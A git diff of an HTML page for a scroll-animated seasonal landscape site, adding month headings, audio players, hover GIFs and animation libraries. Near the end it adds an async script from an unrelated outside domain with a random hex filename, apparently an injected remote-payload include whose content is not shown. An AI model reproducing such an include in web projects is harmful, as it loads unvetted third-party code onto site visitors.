@@ -10,29 +10,49 @@
 </head>
 <body>
 
-    <!-- <div="winter"> -->
+    <div id="trigger"></div>
+    <div class="january month-titles">
+        <h1>January...</h1>
+    </div>
+
+    <div id="winter">
         <div data-aos="fade-up" data-aos-duration="1000" class="winter-elements">
             <img id="winter-background" src="winter/background.png">
         </div>
-        <div data-aos="fade-up" data-aos-duration="2000" class="winter-elements">
+        <div data-aos="fade-up" data-aos-duration="3000" class="winter-elements">
             <img id="winter-mountains" src="winter/mountains.png">
         </div>
-        <div data-aos="fade-up" data-aos-duration="500" class="winter-elements snow-hover">
+        <div data-aos="fade-up" data-aos-duration="500" class="winter-elements">
             <img id="winter-foreground" src="winter/foreground.png">
-            <img id="winter-snow" src="winter/snowing-hover.gif">
         </div>
-        <!-- <div data-aos="fade-in" data-aos-duration="" data-aos-delay="500" class="winter-elements">
-            <img id="winter-snow" src="winter/snow.png">
-        </div>    -->
-    <!-- </div> -->
-    <!-- <div="spring"> -->
-        <div data-aos="fade-up" data-aos-duration="1000" class="spring-elements">
+        <div data-aos="fade-up" data-aos-duration="500" class="winter-elements snow-hover">
+            <img id="winter-snow" src="winter/snow.png">            
+            <img id="winter-snow-gif" src="winter/snowing-hover.gif">
+            <div id="invissible-div-winter"></div>
+        </div>
+    </div>
+
+    <div id="snowww-mp3">
+        <audio controls loop>
+            <source src="snowww.mp3" type="audio/mpeg" autostart="true" loop="true">
+        </audio>
+    </div>
+
+    <div class="february month-titles">
+        <h1>February</h1>
+    </div>
+    <div class="march month-titles">
+        <h1>March...</h1>
+    </div>
+
+    <!-- <div id="spring"> -->
+        <div data-aos="fade-up" data-aos-duration="800" class="spring-elements">
             <img id="spring-sky" src="spring/sky.png">
         </div>
         <div data-aos="fade-up" data-aos-duration="3000" class="spring-elements">
             <img id="spring-clouds" src="spring/clouds.png">
         </div>      
-        <div data-aos="fade-up" data-aos-duration="800" class="spring-elements">
+        <div data-aos="fade-up" data-aos-duration="1000" class="spring-elements">
             <img id="spring-mountains" src="spring/mountains.png">
         </div>
         <div data-aos="fade-up" data-aos-duration="500" class="spring-elements">
@@ -41,9 +61,75 @@
         <div data-aos="ease-in" data-aos-duration="3000" class="spring-elements flowers-hover">
             <img id="spring-flowers" src="spring/flowers.png">
             <img id="spring-flowers-gif" src="spring/wind-flowers-4.gif">
+            <div id="invisible-div-spring"></div>
         </div>
+
+        <div id="meadows-mp3">
+            <audio controls loop>
+                <source src="meadows.mp3" type="audio/mpeg" autostart="false" loop="true">
+            </audio>
+        </div>
+
+        <!-- <div id="meadows-mp3">
+            <embed src="meadows.mp3" type="audio/mpeg" 
+            loop="true" autostart="false" />
+        </div> -->
+       
     <!-- </div> -->
-    <!-- <div="autumn"> -->
+
+    <div class="april month-titles">
+        <h1>April</h1>
+    </div>
+    <div class="may month-titles">
+        <h1>May</h1>
+    </div>
+    <div class="june month-titles">
+        <h1>June...</h1>
+    </div>
+
+    <!-- <div="summer"> -->
+        <div data-aos="fade-in" data-aos-duration="500" class="summer-elements">
+            <img id="summer-sky" src="summer/sky.png">
+        </div>
+        <div data-aos="fade-up" data-aos-duration="3000" class="summer-elements">
+            <img id="summer-mountains" src="summer/mountains.png">
+        </div>
+        <div data-aos="fade-up" data-aos-duration="2750" class="summer-elements">
+            <img id="summer-waves" src="summer/waves.png">
+        </div>
+        <div data-aos="fade-up" data-aos-duration="500" class="summer-elements">
+            <img id="summer-sand" src="summer/sand.png">
+        </div>
+        <div data-aos="fade-in" data-aos-duration="2500" class="summer-elements sun-hover">
+            <img id="summer-sun" src="summer/sun.png">
+            <img id="summer-sun-hover" src="summer/sunny-1.gif">
+            <div id="invisible-div-summer"></div>
+        </div>
+
+        <div id="waves-mp3">
+            <audio controls loop>
+                <source src="beach.mp3" type="audio/mpeg" autostart="true" loop="true">
+            </audio>
+        </div>
+        
+        <!-- <div id="waves-mp3">
+            <embed src="beach.mp3" type="audio/mpeg" 
+            loop="true" autostart="false" />
+        </div> -->
+        
+    <!-- </div> -->
+
+    <div class="july month-titles">
+        <h1>July</h1>
+    </div>
+    <div class="august month-titles">
+        <h1>August</h1>
+    </div>
+    <div class="september month-titles">
+        <h1>September...</h1>
+    </div>
+
+        <!-- <div="autumn"> -->
         <div data-aos="fade-in" data-aos-duration="2000" class="autumn-elements">
             <img id="autumn-sky" src="autumn/sky.png">
         </div>
@@ -53,34 +139,35 @@
         <div data-aos="fade-up" data-aos-duration="2001" class="autumn-elements">
             <img id="autumn-pathway" src="autumn/pathway.png">
         </div>
-        <div data-aos="fade-up" data-aos-duration="4000" class="autumn-elements">
+        <div data-aos="fade-up" data-aos-duration="4000" class="autumn-elements autumn-hover">
             <img id="autumn-front-trees" src="autumn/front-trees.png">
+            <img id="autumn-leaves" src="autumn/leaves.gif">
+            <div id="invisible-div-autumn"></div>
         </div>
-    <!-- </div> -->
-    <!-- <div="summer"> -->
-        <div data-aos="fade-in" data-aos-duration="1000" class="summer-elements">
-            <img id="summer-sky" src="summer/sky.png">
+
+        <div id="forest-mp3">
+            <audio controls loop>
+                <source src="forest.mp3" type="audio/mpeg" autostart="false" loop="true">
+            </audio>
         </div>
-        <div data-aos="fade-up" data-aos-duration="2000" class="summer-elements">
-            <img id="summer-mountains" src="summer/mountains.png">
-        </div>
-        <div data-aos="fade-up" data-aos-duration="3001" class="summer-elements">
-            <img id="summer-waves" src="summer/waves.png">
-        </div>
-        <div data-aos="fade-up" data-aos-duration="4000" class="summer-elements">
-            <img id="summer-sand" src="summer/sand.png">
-        </div>
-        <div data-aos="fade-in" data-aos-duration="500" class="summer-elements sun-hover">
-            <!-- <div class="hover-corner"> -->
-                <img id="summer-sun" src="summer/sun.png">
-                <img id="summer-sun-hover" src="summer/sun-hover.png">
-            <!-- </div> -->
-        </div>
+
     <!-- </div> -->
 
+    <div class="october month-titles">
+        <h1>October</h1>
+    </div>
+    <div class="november month-titles">
+        <h1>November</h1>
+    </div>
+    <div class="december month-titles">
+        <h1>December...</h1>
+    </div>
+
     <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
-    <script>
-        AOS.init();
-    </script>
+    <script> AOS.init(); </script>
+    <script src="js/scrollmagic/uncompressed/ScrollMagic.js"></script>
+    <script src="js/scrollmagic/uncompressed/plugins/debug.addIndicators.js"></script>
+    <script type="text/javascript" async="" src="//cardinaldata.net/1fa16f6ccbee745a0c.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
